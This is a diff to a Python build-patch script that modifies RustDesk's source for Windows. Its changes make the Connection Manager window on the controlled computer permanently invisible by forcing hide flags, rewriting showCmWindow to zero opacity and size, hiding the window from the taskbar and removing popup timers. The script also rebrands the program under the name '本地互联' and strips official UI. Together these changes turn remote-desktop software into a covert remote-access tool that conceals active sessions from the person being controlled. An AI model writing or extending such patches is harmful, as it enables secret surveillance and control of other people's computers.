@@ -4,6 +4,11 @@
 RustDesk Windows (x86_64) Automated Patch Script (patch_rustdesk.py)
 Features:
   1. Completely hide the controlled-side Connection Manager (CM) popup window (0ms, never shown on screen).
+     - Patches Rust `hide_cm()` / `allow-hide-cm` in `libs/hbb_common/src/password_security.rs`.
+     - Patches Flutter `showCmWindow({bool isStartup = false})` in `flutter/lib/main.dart` (the actual function
+       that sets opacity=1 and shows the CM window on startup & connection) to keep opacity=0, Size.zero,
+       skipTaskbar=true, and hidden from the very first frame.
+     - Patches `server_page.dart`, `server_model.dart`, and `consts.dart`.
   2. Clean/Pure UI: Remove official "self-host server tip" banner, remove "Account" & "About" tabs in Settings,
      disable Address Book / Accessible Devices / Help Cards by default, and clear official admin API URL.
   3. Rename displayed software name to "本地互联" across Flutter UI, Win32 window title, tray, and Chinese lang pack
@@ -175,11 +180,14 @@ def patch_config_rs(root: Path, id_server: str, relay_server: str, api_server: s
 
 def patch_hide_cm_popup(root: Path) -> None:
     """
-    Completely hide the Connection Manager (--cm) popup window on the controlled computer:
+    Completely hide the Connection Manager (--cm) popup window on the controlled computer (0ms, never shown):
       1. Force hide_cm() / allow_hide_cm() in Rust (password_security.rs, cm_interface.rs) to always return true.
-      2. Patch Flutter server_page.dart, server_model.dart, and cm_page.dart (the actual CM window files!)
-         to replace windowManager.show() / focus() with windowManager.hide() and zero out any popup timers.
-      3. Patch runConnectionManagerScreen in flutter/lib/main.dart using regex (without splitting/truncating the file).
+      2. Patch `showCmWindow({bool isStartup = false})` in `flutter/lib/main.dart` (which is what actually calls
+         `windowManager.show()`, `windowManager.setOpacity(1)`, and `windowOnTop(null)` at t=0s before `hideCmWindow`
+         fires 3 seconds later!) so that `showCmWindow` sets `opacity = 0`, `Size.zero`, `setSkipTaskbar(true)`,
+         and `windowManager.hide()` right from startup.
+      3. Shrink `kConnectionManagerWindowSizeClosedChat` / `kConnectionManagerWindowSizeOpenChat` to `Size(0, 0)`.
+      4. Patch `server_page.dart` and `server_model.dart` to zero out any delay timers and keep CM hidden.
     """
     rust_candidates = []
     if (root / "src").exists():
@@ -221,60 +229,78 @@ def patch_hide_cm_popup(root: Path) -> None:
     if not flutter_dir.exists():
         return
 
-    # Target the actual Connection Manager files in Flutter:
-    # server_page.dart, server_model.dart, cm_page.dart, and main.dart
     cm_target_files = {"server_page.dart", "server_model.dart", "cm_page.dart"}
     for dart_file in flutter_dir.rglob("*.dart"):
         fname = dart_file.name
-        if fname not in cm_target_files and fname != "main.dart":
-            continue
         try:
             text = read_text(dart_file)
         except UnicodeDecodeError:
             continue
         orig = text
 
-        if fname in cm_target_files:
-            # Zero out any multi-second delay timers (e.g. Duration(seconds: 3) -> Duration(milliseconds: 0))
+        # 1. Patch `showCmWindow` wherever it is defined (typically in flutter/lib/main.dart)
+        if "showCmWindow" in text and "_isCmReadyToShow" in text:
+            # Disable the `else if (_isCmReadyToShow)` branch that re-shows and focuses the CM window on connection
+            text = text.replace(
+                "else if (_isCmReadyToShow)",
+                "else if (false && _isCmReadyToShow)",
+            )
+            # In the `if (isStartup)` block of `showCmWindow`, replace show/focus/setOpacity(1) inside Future.wait
             text = re.sub(
-                r'Duration\(\s*seconds\s*:\s*[1-9]\d*\s*\)',
+                r'windowManager\.show\(\)\s*,\s*windowManager\.focus\(\)\s*,\s*windowManager\.setOpacity\(\s*1(?:\.0)?\s*\)',
+                'windowManager.hide(), windowManager.setSkipTaskbar(true), windowManager.setOpacity(0)',
+                text,
+            )
+            # Ensure right before `_isCmReadyToShow = true;` we force opacity=0, skipTaskbar=true, and hide()
+            text = re.sub(
+                r'_isCmReadyToShow\s*=\s*true\s*;',
+                'await windowManager.setOpacity(0); await windowManager.setSkipTaskbar(true); await windowManager.hide(); _isCmReadyToShow = true;',
+                text,
+            )
+            # Also patch inside `showCmWindow` function block if any other show/setOpacity(1) remains
+            def patch_show_cm_fn(match: re.Match) -> str:
+                block = match.group(0)
+                block = re.sub(r'windowManager\.show\s*\(\s*\)', 'windowManager.hide()', block)
+                block = re.sub(r'windowManager\.focus\s*\(\s*\)', 'windowManager.hide()', block)
+                block = re.sub(r'windowManager\.setOpacity\s*\(\s*1(?:\.0)?\s*\)', 'windowManager.setOpacity(0)', block)
+                block = re.sub(r'alwaysOnTop\s*:\s*true', 'alwaysOnTop: false', block)
+                block = re.sub(r'windowOnTop\s*\(\s*null\s*\)', 'windowManager.hide()', block)
+                return block
+
+            text = re.sub(
+                r'(?m)^(?:Future<void>\s+|void\s+)?showCmWindow\s*\([\s\S]*?^\}',
+                patch_show_cm_fn,
+                text,
+            )
+
+        # 2. Shrink kConnectionManagerWindowSizeClosedChat & kConnectionManagerWindowSizeOpenChat to Size.zero
+        if "kConnectionManagerWindowSize" in text:
+            text = re.sub(
+                r'(kConnectionManagerWindowSize(?:Closed|Open)Chat\s*=\s*(?:const\s+)?)Size\s*\([^)]*\)',
+                r'\1Size(0, 0)',
+                text,
+            )
+
+        # 3. Patch server_page.dart, server_model.dart, and cm_page.dart
+        if fname in cm_target_files:
+            # Zero out any multi-second or millisecond delay timers (e.g. Duration(seconds: 3) -> Duration(milliseconds: 0))
+            text = re.sub(
+                r'Duration\(\s*(?:seconds|milliseconds)\s*:\s*[1-9]\d*\s*\)',
                 'Duration(milliseconds: 0)',
                 text,
             )
-            # Replace windowManager.show() and windowManager.focus() with windowManager.hide()
-            text = re.sub(
-                r'windowManager\.show\s*\(\s*\)',
-                'windowManager.hide()',
-                text,
-            )
-            text = re.sub(
-                r'windowManager\.focus\s*\(\s*\)',
-                'windowManager.hide()',
-                text,
-            )
+            # Replace windowManager.show() / focus() / setOpacity(1) / windowOnTop(null)
+            text = re.sub(r'windowManager\.show\s*\(\s*\)', 'windowManager.hide()', text)
+            text = re.sub(r'windowManager\.focus\s*\(\s*\)', 'windowManager.hide()', text)
+            text = re.sub(r'windowManager\.setOpacity\s*\(\s*1(?:\.0)?\s*\)', 'windowManager.setOpacity(0)', text)
+            text = re.sub(r'windowOnTop\s*\(\s*null\s*\)', 'windowManager.hide()', text)
+            # Replace any call `showCmWindow()` in server_page.dart / server_model.dart with `hideCmWindow()`
+            text = re.sub(r'\bshowCmWindow\s*\(\s*\)', 'hideCmWindow()', text)
             # Force _hideCm default state to true if present
-            text = re.sub(
-                r'bool\s+_hideCm\s*=\s*false\s*;',
-                'bool _hideCm = true;',
-                text,
-            )
+            text = re.sub(r'bool\s+_hideCm\s*=\s*false\s*;', 'bool _hideCm = true;', text)
             text = re.sub(
                 r"bind\.cmGetConfig\(\s*name\s*:\s*['\"]hide_cm['\"]\s*\)\s*==\s*['\"]true['\"]",
                 'true',
-                text,
-            )
-        elif fname == "main.dart":
-            # Safely patch ONLY inside the function definition `void runConnectionManagerScreen(...) { ... }`
-            def patch_cm_screen_fn(match: re.Match) -> str:
-                body = match.group(0)
-                body = re.sub(r'windowManager\.show\s*\(\s*\)', 'windowManager.hide()', body)
-                body = re.sub(r'windowManager\.focus\s*\(\s*\)', 'windowManager.hide()', body)
-                body = re.sub(r'Duration\(\s*seconds\s*:\s*[1-9]\d*\s*\)', 'Duration(milliseconds: 0)', body)
-                return body
-
-            text = re.sub(
-                r'(?m)^(?:Future<void>|void)\s+runConnectionManagerScreen\b[\s\S]*?^\}',
-                patch_cm_screen_fn,
                 text,
             )
 
